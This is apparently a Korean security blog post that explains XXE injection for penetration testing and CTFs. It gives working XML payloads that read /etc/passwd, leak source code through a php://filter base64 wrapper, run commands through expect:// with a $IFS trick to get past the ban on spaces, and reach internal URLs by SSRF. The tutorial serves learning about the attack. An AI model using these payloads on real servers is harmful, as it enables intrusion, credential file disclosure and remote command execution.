---

layout: post
title: "XML External Entities(XXE) Injection "
excerpt: "Try to know xxe & use it ~_~"
date: 2020-07-11
categories: [Web]
comments: true 
---

이번에는 모의해킹 업무와 ctf에 자주 등장하는데 그간 정리를 안했던 XXE에 대하여 알아보자. 

<h3> 0x0. XML</h3>

XML이란 다른 특수 목적의 마크업 언어를 만드는 용도로 사용된 언어이다. 이를 이용한 XML Entity는 반복적으로 사용되는 문자열이나 특수 문자를 XML문서에서 사용하기 위하여 미리 정의한 것이다. 이는 앰퍼샌드로 시작하고 세미콜론으로 끝난다.

```xml
<simple>&test;</simple>
```

이런 형식의 test가 XML Entity이다.

XML을 내부에 정의한 경우

``` xml-dtd
<!ENTITY name "value">
```

이런 방식으로 정의를 하고, 위에서 말한 방식으로 이용한다.

XML을 외부에 정의한 경우

```xml-dtd
<!ENTITY name SYSTEM "url or file">
```

이렇게 하며  url or file에 입력한 주소의 내용이 그 Entity의 값으로 이용된다.



<h3>0x1. XXE Injection</h3>

위에서 말한 XML Entity를 이용하여 악의적인 공격을 하는 행위를 XXE Injection이라고 하는데, 공격자가 직접 XML Entity를 외부에  정의하여 이를 악용할 수 있다. XML타입의 데이터를 웹을 통해 전송하는데 서버에서 XML외부 엔티티가 실행이 가능하다면 아래와 같이 시행 가능하다.

```xml-dtd
<!DOCTYPE test[
<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
```

이런식으로 /etc/passwd를 확인하는 xml을 불러와서 공격할 수 있다. 



<h3> 0x2. Tip</h3>

이번에는 xxe공격을 할 때의 팁이나 다른 정보들을 추가하려고 한다.

우선 처음으로는 그냥 dtd를 통하여 내부 파일을 불러오려고 하면 잘 안되는 경우가 있다. 그런 상황에서는 php에 wrapper클래스를 사용하여 base64등의 형태로 인코딩시켜서 출력을 하면 보통의 경우는 잘 된다.

```xml-dtd
<!DOCTYPE test [  
  <!ELEMENT testman ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
```

이 방법은 xxe를 통한 lfi공격 이외에도 그냥 일반적으로 무언가를 릭해올 때 거의 해당된다.

다음은 xxe를 통하여 RCE를 할 때는 아래와 같이 가능하다. 

```xml-dtd
<!DOCTYPE test [ 
<!ELEMENT testman ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
```

이렇게 하면 php가  id를 실행하게 된다. 하지만 다양한 명령어를 사용할 때 공백이 필요한데 그런 경우에 공백을 넣으면 에러가 발생한다. 

```xml-dtd
<!DOCTYPE test [ 
<!ELEMENT testman ANY >
<!ENTITY xxe SYSTEM "expect://cat$IFS/etc/passwd" >]>
```

 공백에 관한 에러는  $IFS등의 다양한 방법으로 우회를 해주면 된다. 

다음으로는 XXE를 이용한 SSRF이다. 당연히 서버 내부의 권한으로 XML엔티티를 선언하고 실행하는 것이기 때문에 SSRF도 가능하다. 일반적인 사용자의 권한에서는 볼 수 없던 내용도 서버 내부의 권한으로는 가능하다.

```xml-dtd
<!DOCTYPE test [ 
<!ELEMENT testman (#ANY)>
<!ENTITY xxe SYSTEM "https://internal_domain/any.php">]>
```

이렇게 해주면 내부 url에 접근이 가능하다. 또한 추가적으로  curl을 이용하여도 접근이 가능하다.

이외에도 추가적으로 DOS공격이나 다른 인코딩을 사용하여 공격하는 방법등이 있는데 나중에 문제를 풀다가 나온다면 

그때 정리해보겠다.